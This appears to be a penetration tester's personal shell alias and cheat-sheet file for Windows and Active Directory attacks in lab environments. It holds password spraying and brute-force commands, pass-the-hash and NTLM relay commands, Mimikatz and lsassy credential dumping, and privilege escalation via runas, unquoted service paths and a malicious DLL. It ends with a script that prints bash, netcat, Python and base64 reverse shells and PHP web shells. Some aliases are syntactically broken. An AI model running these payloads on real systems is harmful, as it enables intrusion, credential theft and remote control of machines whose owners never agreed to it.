#$DOMAIN = hackn.lab or medtech.com
#$DC = server01.hackn.lab or dc01.medtech.com
# alias example='(){ echo Your arg was $1. ;}'
alias magic='source /home/kali/.kali'
alias setip="/home/kali/setip.py && source /home/kali/.kali"
export ip="34324"
alias s='(){grep -i "$1" /home/kali/.kali --color}'
alias setcwd='hash -d cwd=`pwd`'
alias printcwd='echo ~cwd'
alias shells='(){ shells.sh $1 ;}'

#### SMB ####
#enum4linux -a $ip
alias auto_crackmapexec='echo "crackmapexec smb 192.168.200.75 -u usernames.txt -p 'Nexus123!' -d corp.com --continue-on-success";echo "or --shares"'

#### DNS ####
alias auto_dnsrecon='dnsrecon -d $ip /usr/share/wordlists/dnsmap.txt -t std --xml dnsrecon.md'
alias dnsrecon_list='dnsrecon -d megacorpone.com -t axfr'

#### LDAP ###
alias auto_ldap='(){ldapsearch -h "$1" -p "$2" -x -s base}'

#### Transfer Files #####
alias pyserv='python3 -m http.server'
alias iwr='(){echo "iwr -uri http://"$ip":8000/"$1" -Outfile "$1""'
alias startWebDav='(){wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/}'

#### Hydra #####
alias hydra_unk='(){hydra -L /usr/share/wordlists/dirb/others/names.txt -P /usr/share/wordlists/rockyou.txt -vV "$ip" "$1"}'
alias hydra_gethttp='(){hydra -l admin -P /usr/share/wordlists/rockyou.txt $ip http-get "$1"' # $1 = /webpage/
alias hydra_httppostform='(){echo "hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=^USER^&fm_pwd=^PASS^:Login failed. Invalid"}'

#### Impacket ####
alias imp-psexec='impacket-psexec -hashes 00000000000000000000000000000000:"$1" "$username"@"$ip"' # $1 = NT Hash
alias imp-wmiexec='impacket-wmiexec -hashes 00000000000000000000000000000000:"$1" "$username"@"$ip"' # $1 = NT Hash
alias imp-ntlmrelayx='impacket-ntlmrelayx --no-http-server -smb2support -t "$ip" -c "powershell -enc JABjAGwAaQBlAG5...."' #dir \\192.168.119.2\test -> on tgt machine to catch hash
alias imp-mssqlclient='impacket-mssqlclient "$username":"$1"@"$ip" -windows-auth' # $1 = share name
#alias mysql= -u root -p 'root' -h 192.168.50.16 -P 3306
#alias powershell_oneliner='(){powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://$ip:8000/powercat.ps1');
powercat -c 192.168.45.245 -p 4444 -e powershell"
#### Ligolo-ng ####
alias ligolo_start='(){sudo ip tuntap add user `hostname` mode tun ligolo;sudo ip link set ligolo up;./proxy -self-cert}'
alias ligolo_client_echo='(){echo "./agent -connect $LHOST:11601";echo "sudo ip route add _IP_ dev ligolo"}'
alias ligolo_listeners_echo='(){echo "listener_add --addr 0.0.0.0:9001 --to 127.0.0.1:4444 --tcp";echo "listener_add --addr 0.0.0.0:9000 --to 127.0.0.1:4444 --tcp"}'
alias ligolo_magicip='echo "Local Ligolo Agent IP = 240.0.0.1"'

#### Mimikatz ####
alias mimikatz_print='echo ".\mimikatz.exe \n privilege::debug \n sekurlsa::logonpasswords \n token::elevate \n lsadump::sam"'

#### Get Usernames ####
alias get_kerb_users_nmap="(){nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=''}" # realm=medtech.com
#kerbrute= kerbrute bruteuser -d test.local passwords.txt john

#### lsassy ####
#lsassy -d hackn.lab -u pixis -p P4ssw0rd 192.168.1.0/24
alias lsassy_users='lsassy -d $domain -u $username -H $HASH $RHOST --users'
alias lsassy_pl_creds='lsassy -d hackn.lab -u $username -p $password $RHOSTS'
alias lsassy_procdump='lsassy -d hackn.lab -u $username -p $password dc01.hackn.lab -m procdump -O procdump_path=/opt/Sysinternals/procdump.exe'
alias lsassy_dumpert -d hackn.lab -u $username -p $password dc01.hackn.lab -m dumpert -O dumpert_path=/opt/dumpert.exe
alias lsassy_dumpertdll='lsassy -d hackn.lab -u $username -p $password dc01.hackn.lab -m dumpertdll -O dumpertdll_path=/opt/dumpert.dll
# Kerberos tickets harvesting
alias lsassy_tickets='lsassy -d hackn.lab -u pixis -p P4ssw0rd dc01.hackn.lab -K "/tmp/kerberos_tickets"'
# Cleartext credentials
alias lsassy_local_creds_txt='lsassy -u $username -p $password server01.hackn.lab' ## Local user
alias lsassy_domain_creds_txt='lsassy -d hackn.lab -u $username -p $password server01.hackn.lab' ## Domain user
#Pass-the-Hash
alias lsassy_pth='lsassy -d hackn.lab -u jsnow -H aad3b435b51404eeaad3b435b51404ee:38046f6aa4f7283f9a6b7e1575452109 server01.hackn.lab'
# LM:NT OR # lsassy -d hackn.lab -u jsnow -H 38046f6aa4f7283f9a6b7e1575452109 server01.hackn.lab
aad3b435b51404eeaad3b435b51404ee
#### Get Hashes ####
alias getnpusers='(){python3 GetNPUsers.py test.local/ -dc-ip "$1" -usersfile usernames.txt -format hashcat -outputfile getnpusers_hashes.txt}`
#### Found Hash #######
alias smbhashlogin='smbclient \\\\$ip\\secrets -U Administrator --pw-nt-hash $HASH' # $HASH = nt hash
#smbclient //server/share --directory path/to/directory -c 'get file.txt'
#`net view \\\\dc01 /all`
#### Pivoting ####
# evil-winrm -i 10.10.10.1 -u john -H c23b2e293fa0d312de6f59fd6d58eae3
##### Runas #####
EoP - Runas
Use the cmdkey to list the stored credentials on the machine.

#### Windows PrivEsc ####
alias printPrintSpoofer='echo ".\PrintSpoofer64.exe -i -c cmd"'
alias powerup='echo ". .\PowerUp.ps1 ; Invoke-AllChecks"'
end

```
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
Then you can use runas with the /savecred options in order to use the saved credentials. The following example is calling a remote binary via an SMB share.

runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
runas /savecred /user:Administrator "cmd.exe /k whoami"
Using runas with a provided set of credential.


C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"

$secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
$computer = "<hostname>"
[System.Diagnostics.Process]::Start("C:\users\public\nc.exe","<attacker_ip> 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)

##### Unquoted Service #####
# find the vulnerable application
C:\> powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1'); Invoke-AllChecks"

...
[*] Checking for unquoted service paths...
ServiceName   : BBSvc
Path          : C:\Program Files\Microsoft\Bing Bar\7.1\BBSvc.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -ServiceName 'BBSvc' -Path <HijackPath>
...

# automatic exploit
Invoke-ServiceAbuse -Name [SERVICE_NAME] -Command "..\..\Users\Public\nc.exe 10.10.10.10 4444 -e cmd.exe"
##### DLL Hijacking 2.0 #####
#alias PowerUp='Write-HijackDll -DllPath 'C:\Temp\wlbsctrl.dll'
##### DLL Hijacking ####
# find missing DLL 
- Find-PathDLLHijack PowerUp.ps1
- Process Monitor : check for "Name Not Found"
##### Unquoted Service Path ####
#powershell -nop -exec bypass -c "(New-Object Net.WebClient).DownloadFile('http://192.168.0.114:8080/common.exe', 'C:\Program Files\Unquoted Path Service\common.exe')"

# compile a malicious dll
- For x64 compile with: "x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll"
- For x86 compile with: "i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll"

# content of windows_dll.c
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k whoami > C:\\Windows\\Temp\\dll.txt");
        ExitProcess(0);
    }
    return TRUE;
}

##### shell info script ###
'''
LIP=$(ip -4 a show tun0 | grep -Po 'inet \K[\d.]+')

if [ $# -eq 0 ]
then
  PORT=64385
else
  PORT=$1
fi

echo "Local IP=$LIP"
echo "PORT=$PORT"

echo ""
echo '********** Bash **********'
echo "bash -c 'bash -i >& /dev/tcp/$LIP/$PORT 0>&1'"
echo "bash+-c+'bash+-i+>%26+/dev/tcp/$LIP/$PORT+0>%261'"
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LIP $PORT >/tmp/f"
echo "rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f%7C/bin/sh%20-i%202%3E%261%7Cnc%20$LIP%20$PORT%20%3E/tmp/f"
echo "nc $LIP $PORT -e /bin/sh"

ENCODED=$(echo -ne "bash -c 'bash -i >& /dev/tcp/$LIP/$PORT 0>&1'" | base64 -w0)
echo "echo $ENCODED | base64 -d | sh"

echo ""
echo '********** PHP **********'
cat << "EOF"
<?php
  if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
  }
?>
EOF
echo '<%3fphp+if(isset($_REQUEST['cmd'])){+echo+"<pre>"%3b+$cmd+%3d+($_REQUEST['cmd'])%3b+system($cmd)%3b+echo+"</pre>"%3b+die%3b+}+%3f>'
echo '<?php echo system($_GET['cmd']); ?>'
echo '<%3fphp+echo+system($_GET[cmd])%3b+%3f>'

echo ""
echo '********** Python **********'
echo '## Python 2'
cat << EOF
python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$LIP\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"
EOF
echo '## Python 3'
cat << EOF
/usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$LIP",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
EOF

echo ""
echo '********** PowerShell **********'
echo "pshell.py $LIP $PORT"

echo ""
echo '********** Windows NetCat **********'
echo ".\\nc.exe $LIP $PORT -e cmd.exe"

echo ""
echo '********** Interactive Shell **********'
cat << EOF
which python python2 python3
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm-256color
alias ll='ls -lsaht --color=auto'
# Ctrl + Z [Background Process]
stty raw -echo;fg;reset
stty columns 118 rows 64
EOF
'''
